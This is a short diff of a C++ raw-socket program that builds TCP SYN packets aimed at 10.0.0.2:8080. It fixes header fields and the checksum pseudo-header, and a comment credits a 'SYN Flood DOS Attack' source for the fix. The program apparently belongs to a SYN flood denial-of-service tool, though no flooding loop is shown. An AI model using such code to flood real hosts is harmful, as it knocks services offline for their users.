@@ -5,7 +5,10 @@
 #include <arpa/inet.h>
 #include <cstring>
 
-#define __DEBUG__ false
+#define __DEBUG__ true
+
+// https://github.com/seifzadeh/c-network-programming-best-snipts/blob/master/SYN%20Flood%20DOS%20Attack%20with%20C%20Source%20Code%20(Linux)
+// "Bogus TCP length" problem is fixed thanks to implementation at above link
 
 void debug_print(const std::string & msg) {
     if (true == __DEBUG__) {
@@ -82,16 +85,16 @@ int main() {
 
     tcp_header->dest = htons(8080);
     tcp_header->source = htons(8080);
-    tcp_header->doff = 0; // TODO ?
+    tcp_header->doff = 5;
     tcp_header->syn = 1;
-    tcp_header->window = 255; // TODO ?
+    tcp_header->window = htons(5840); //set to maximum
 
     // prepare pseudo header for tcp checksum, by rfc
     PSEUDO_HEADER pseudo_header{};
 
     pseudo_header.dest_addr = inet_addr("10.0.0.2");
     pseudo_header.protocol = 6;
-    pseudo_header.tcp_length = static_cast<unsigned short>(TCP_HEADER_SIZE);
+    pseudo_header.tcp_length = htons(TCP_HEADER_SIZE);
 
     const int OPTION_SET = 1;
     int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
